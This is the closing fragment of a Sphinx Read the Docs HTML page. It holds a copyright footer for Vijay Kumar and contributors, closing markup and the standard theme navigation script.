    <p>&#169; Copyright Vijay Kumar &amp; Contributors.</p>
  </div>

   

</footer>
        </div>
      </div>
    </section>
  </div>
  <script>
      jQuery(function () {
          SphinxRtdTheme.Navigation.enable(false);
      });
  </script> 

</body>
</html>